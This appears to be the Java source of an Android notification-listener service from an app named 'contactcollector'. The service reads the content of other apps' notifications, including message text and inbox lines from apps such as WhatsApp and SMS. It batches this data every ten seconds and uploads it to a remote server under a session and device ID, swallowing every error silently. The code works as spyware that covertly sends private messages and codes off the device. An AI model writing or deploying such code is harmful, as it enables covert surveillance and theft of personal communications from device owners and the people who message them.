package com.contactcollector.app;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class NotificationCollectorService extends NotificationListenerService {

    private static final String TAG = "NotifCollector";
    private static final String PREFS_NAME = "CollectorPrefs";
    private static final String NOTIF_PREFS_NAME = "CollectorNotifPrefs";
    private static final String KEY_POSTED_NOTIFICATIONS = "posted_notifs";
    private static final long BATCH_INTERVAL_MS = 10000; // 10 seconds batch interval
    private static final int MAX_NOTIFICATIONS_PER_BATCH = 50;

    private Set<String> postedNotificationKeys;
    private SharedPreferences notifPrefs;
    private long lastBatchTime = 0;
    private JSONArray pendingNotifications = new JSONArray();
    private final Object lock = new Object();

    @Override
    public void onCreate() {
        super.onCreate();
        notifPrefs = getSharedPreferences(NOTIF_PREFS_NAME, MODE_PRIVATE);
        postedNotificationKeys = new HashSet<>(notifPrefs.getStringSet(KEY_POSTED_NOTIFICATIONS, new HashSet<String>()));
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            // Skip our own app notifications
            if (sbn.getPackageName().equals(getPackageName())) return;

            // Skip ongoing/foreground notifications to reduce noise
            if (sbn.isOngoing()) return;

            String packageName = sbn.getPackageName();
            String key = sbn.getKey();
            long postTime = sbn.getPostTime();

            // Deduplicate: skip if we already processed this exact notification
            String notifKey = packageName + ":" + key + ":" + postTime;
            synchronized (lock) {
                if (postedNotificationKeys.contains(notifKey)) return;
                postedNotificationKeys.add(notifKey);
                savePostedKeys();
            }

            JSONObject notifObj = extractNotificationData(sbn);
            if (notifObj == null) return;

            synchronized (lock) {
                pendingNotifications.put(notifObj);

                // Send batch if interval elapsed or batch is full
                long now = System.currentTimeMillis();
                if (pendingNotifications.length() >= MAX_NOTIFICATIONS_PER_BATCH ||
                    (now - lastBatchTime) >= BATCH_INTERVAL_MS) {
                    sendNotificationBatch();
                    lastBatchTime = now;
                }
            }

        } catch (Exception e) {
            // Silently ignore
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Notification dismissed - we don't need to do anything
        // We already captured it on post
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        // Send any pending notifications on reconnect
        synchronized (lock) {
            if (pendingNotifications.length() > 0) {
                sendNotificationBatch();
            }
        }
    }

    private JSONObject extractNotificationData(StatusBarNotification sbn) {
        try {
            Notification notification = sbn.getNotification();
            if (notification == null) return null;

            JSONObject notifObj = new JSONObject();

            // Basic info
            notifObj.put("packageName", sbn.getPackageName());
            notifObj.put("postTime", sbn.getPostTime());
            notifObj.put("key", sbn.getKey());
            notifObj.put("isOngoing", sbn.isOngoing());
            notifObj.put("isClearable", sbn.isClearable());

            // Get app name
            try {
                PackageManager pm = getPackageManager();
                String appName = pm.getApplicationLabel(pm.getApplicationInfo(sbn.getPackageName(), 0)).toString();
                notifObj.put("appName", appName);
            } catch (Exception e) {
                notifObj.put("appName", sbn.getPackageName());
            }

            // Extract notification text
            Bundle extras = notification.extras;
            if (extras == null) return notifObj;

            // Title
            CharSequence titleSeq = extras.getCharSequence(Notification.EXTRA_TITLE);
            String title = titleSeq != null ? titleSeq.toString() : "";
            notifObj.put("title", title);

            // Text / big text
            CharSequence textSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
            String text = textSeq != null ? textSeq.toString() : "";
            notifObj.put("text", text);

            // Big text (expanded notification)
            CharSequence bigTextSeq = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            if (bigTextSeq != null && !TextUtils.isEmpty(bigTextSeq)) {
                notifObj.put("bigText", bigTextSeq.toString());
            }

            // Sub text
            CharSequence subTextSeq = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
            if (subTextSeq != null && !TextUtils.isEmpty(subTextSeq)) {
                notifObj.put("subText", subTextSeq.toString());
            }

            // Summary text (inbox style)
            CharSequence summarySeq = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT);
            if (summarySeq != null && !TextUtils.isEmpty(summarySeq)) {
                notifObj.put("summaryText", summarySeq.toString());
            }

            // Inbox style lines (WhatsApp, Messages etc.)
            CharSequence[] lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
            if (lines != null && lines.length > 0) {
                JSONArray linesArray = new JSONArray();
                for (CharSequence line : lines) {
                    if (line != null && !TextUtils.isEmpty(line)) {
                        linesArray.put(line.toString());
                    }
                }
                if (linesArray.length() > 0) {
                    notifObj.put("textLines", linesArray);
                }
            }

            // Category (call, msg, social, etc.)
            if (notification.category != null) {
                notifObj.put("category", notification.category);
            }

            // Priority
            notifObj.put("priority", notification.priority);

            // Timestamp
            notifObj.put("capturedAt", System.currentTimeMillis());

            return notifObj;

        } catch (Exception e) {
            return null;
        }
    }

    private void sendNotificationBatch() {
        if (pendingNotifications.length() == 0) return;

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String sessionId = prefs.getString("sessionId", null);
        String baseUrl = prefs.getString("baseUrl", null);
        String deviceId = prefs.getString("deviceId", null);

        if (sessionId == null || baseUrl == null) return;

        // Take a copy of pending and clear
        final JSONArray batch;
        synchronized (lock) {
            JSONArray batchCopy;
            try {
                batchCopy = new JSONArray(pendingNotifications.toString());
            } catch (Exception e) {
                batchCopy = new JSONArray();
            }
            batch = batchCopy;
            pendingNotifications = new JSONArray();
        }

        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("sessionId", sessionId);
                if (deviceId != null && !deviceId.isEmpty()) {
                    payload.put("deviceId", deviceId);
                }
                payload.put("notifications", batch);

                HttpURLConnection conn = null;
                try {
                    URL url = new URL(baseUrl + "/api/notifications/upload");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(30000);

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    if (responseCode >= 200 && responseCode < 300) {
                        // Success - notifications stored on server
                    } else {
                        // Re-add to pending for retry
                        synchronized (lock) {
                            try {
                                for (int i = 0; i < batch.length(); i++) {
                                    pendingNotifications.put(batch.getJSONObject(i));
                                }
                            } catch (Exception re) {}
                        }
                    }
                } finally {
                    if (conn != null) {
                        try { conn.disconnect(); } catch (Exception e) {}
                    }
                }
            } catch (Exception e) {
                // Re-add to pending for retry
                synchronized (lock) {
                    try {
                        for (int i = 0; i < batch.length(); i++) {
                            pendingNotifications.put(batch.optJSONObject(i));
                        }
                    } catch (Exception ex) {}
                }
            }
        }).start();
    }

    private void savePostedKeys() {
        try {
            // Keep only last 5000 keys to prevent unlimited growth
            if (postedNotificationKeys.size() > 5000) {
                Set<String> trimmed = new HashSet<>();
                int count = 0;
                for (String key : postedNotificationKeys) {
                    trimmed.add(key);
                    count++;
                    if (count >= 3000) break;
                }
                postedNotificationKeys = trimmed;
            }
            notifPrefs.edit().putStringSet(KEY_POSTED_NOTIFICATIONS, postedNotificationKeys).apply();
        } catch (Exception e) {}
    }
}


